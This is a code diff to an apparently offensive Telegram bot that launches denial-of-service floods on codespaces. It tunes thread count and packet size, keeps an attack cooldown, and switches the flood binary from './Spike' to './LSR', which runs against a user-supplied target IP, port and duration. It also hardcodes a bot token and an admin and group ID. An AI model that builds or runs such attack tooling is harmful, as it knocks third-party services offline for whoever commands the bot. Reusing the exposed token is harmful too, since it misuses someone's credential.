@@ -29,8 +29,8 @@ ADMIN_IDS = [7163028849]
 # Add this global variable at the top of your script
 ALLOWED_GROUP_ID = -1002400803425  # Replace with your actual group ID
 BOT_TOKEN = "7934887542:AAFu9iTGdI8gAqCDlfiBmE-MIOGPIi5Q-HU"
-thread_count = 900
-packet_size = 8
+thread_count = 500
+packet_size = 12
 ADMIN_FILE = 'admin_data.json'
 last_attack_times = {}
 COOLDOWN_MINUTES = 3
@@ -355,7 +355,7 @@ async def run_attack_command_on_codespace(target_ip, target_port, duration, chat
         update_last_attack_time(user_id)
 
         # Construct command for dark binary with thread count and packet size
-        command = f"./Spike {target_ip} {target_port} {duration} {packet_size} {thread_count}"
+        command = f"./LSR {target_ip} {target_port} {duration} {packet_size} {thread_count}"
 
         # Send initial attack message
         bot.send_message(chat_id, 
